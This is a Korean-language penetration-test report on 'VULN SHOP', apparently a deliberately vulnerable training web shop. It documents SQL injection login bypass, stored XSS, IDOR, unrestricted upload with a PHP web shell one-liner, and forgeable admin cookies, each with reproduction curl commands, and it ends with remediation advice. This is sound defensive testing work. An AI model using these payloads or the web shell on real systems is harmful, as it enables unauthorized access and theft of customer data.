# VULN SHOP 취약점 보고서 (2025-12-10)

## 공통 정보
- TARGET: http://192.168.0.28:3000
- 요청 헤더: `X-Forwarded-For: 10.0.0.102`

## 1) 인증 우회/SQL Injection (`/login`)
- 현상: 로그인 폼에서 입력 검증이 없어 `admin' OR '1'='1` 입력 시 302 리다이렉트와 함께 `user=admin; isAdmin=false; user_id=1` 쿠키가 발급됨.
- 재현:
  - `curl -i -c /tmp/vulnshop.cookies -H "X-Forwarded-For: 10.0.0.102" -X POST --data-urlencode "username=admin' OR '1'='1" --data-urlencode "password=pw" http://192.168.0.28:3000/login`
- 영향: 인증 우회로 임의 사용자 세션 획득, 이후 주문/프로필 등 내부 기능 접근 가능.

## 2) 저장형 XSS (`/board`)
- 현상: 게시글 내용이 이스케이프 없이 렌더링됨. `<script>alert(1337)</script>` 게시 후 페이지에서 그대로 실행되는 스크립트 확인.
- 재현:
  - `curl -i -H "X-Forwarded-For: 10.0.0.102" -X POST -d "content=<script>alert(1337)</script>" http://192.168.0.28:3000/board`
  - 이후 `/board` 재조회 시 동일 스크립트 표시.
- 영향: 방문자 세션 탈취, 관리자/사용자 대상 피싱 및 추가 공격 발판 제공.

## 3) IDOR (`/order?id=...`)
- 현상: 로그인 후 주문 상세를 단순 ID 파라미터로 접근 가능. `order?id=2` 요청 시 타 사용자(주문 #2) 상품/배송 정보 노출.
- 재현:
  - 로그인 쿠키 사용: `curl -s -b /tmp/vulnshop.cookies -H "X-Forwarded-For: 10.0.0.102" "http://192.168.0.28:3000/order?id=2"`
- 영향: 다른 고객 주문 내역 및 배송 정보 노출로 인한 개인정보 유출.

## 4) 무제한 파일 업로드 (`/profile/upload`)
- 현상: 파일 확장자/콘텐츠 검증 없이 업로드되고 `/uploads` 하위에 그대로 노출. 기본 프로필에서 `/uploads/shell.php`(내용: `<?php system($_GET['cmd']); ?>`)가 서빙됨.
- 재현:
  1. 로그인 쿠키 유지 상태에서 `curl -i -b /tmp/vulnshop.cookies -H "X-Forwarded-For: 10.0.0.102" -F "profile_image=@script/poc.txt" http://192.168.0.28:3000/profile/upload`
  2. 업로드 후 `http://192.168.0.28:3000/uploads/poc.txt`로 접근 시 파일 내용이 그대로 노출.
- 영향: 악성 스크립트/웹셸 업로드 및 공개 배포 가능. PHP 실행 환경일 경우 원격 명령 실행으로 직결될 수 있음.

## 5) 세션 쿠키 신뢰/위조 가능 (서명·검증 없음)
- 현상: 로그인 과정을 거치지 않아도 `user`, `isAdmin`, `user_id` 쿠키를 임의로 설정하면 보호 자원에 접근 가능. 예: `user=attacker; isAdmin=false; user_id=1` 쿠키만으로 `/order` 200 응답, `user=admin; isAdmin=true; user_id=1`로 `/profile` 접근 성공.
- 재현:
  - `curl -i -b "user=attacker; isAdmin=false; user_id=1" -H "X-Forwarded-For: 10.0.0.102" http://192.168.0.28:3000/order`
  - `curl -i -b "user=admin; isAdmin=true; user_id=1" -H "X-Forwarded-For: 10.0.0.102" http://192.168.0.28:3000/profile`
- 영향: 로그인/권한 검증을 우회해 임의 사용자 세션 및 관리자 권한을 위조할 수 있음.

## 6) 세션 쿠키 보안 속성 부재
- 현상: `user`, `isAdmin`, `user_id` 쿠키에 HttpOnly, Secure, SameSite 설정 없음(로그인 응답 Set-Cookie 확인).
- 영향: XSS로 쿠키 탈취 가능, HTTPS 사용 시에도 전송 보안 약화, CSRF 방어 미비.

## 7) CSRF 보호 미구현
- 현상: `/board` 게시글 작성, `/login`, `/profile/upload`, `/order` 등 상태 변경/민감 요청에 CSRF 토큰이 없고 Referer/Cookie 외 추가 검증도 없음.
- 영향: 사용자가 로그인한 상태에서 외부 사이트를 통해 게시글 작성, 파일 업로드, 주문 조회 등 강제 수행 가능. XSS와 결합 시 영향 확대.

## 대응 권고
- 인증: 모든 SQL 쿼리에 Prepared Statement 사용, 특수문자 이스케이프, 인증 실패 시 일반 오류만 반환.
- 출력: 게시글/입력 데이터는 컨텍스트에 맞춰 HTML 이스케이프 적용, CSP 강화.
- 권한: 주문 상세 등 식별자 기반 리소스 접근 시 세션 사용자와 매핑 검증, 예외 시 403 처리. 세션 쿠키에 서명/암호화 적용하고 서버 측 세션으로 검증.
- 업로드: 허용 확장자/콘텐츠 타입 화이트리스트, 파일명 난수화 후 웹루트 외 저장, 필요 시 이미지 변환 후 재저장. 업로드 디렉터리에 실행 금지 설정.
- 세션: HttpOnly/Secure/SameSite=strict 적용, 쿠키 값 서명/암호화, 관리자 권한 정보는 서버 세션에만 보관.
- CSRF: 모든 상태 변경 엔드포인트에 CSRF 토큰 또는 ORIGIN/REFERER 검증 적용.
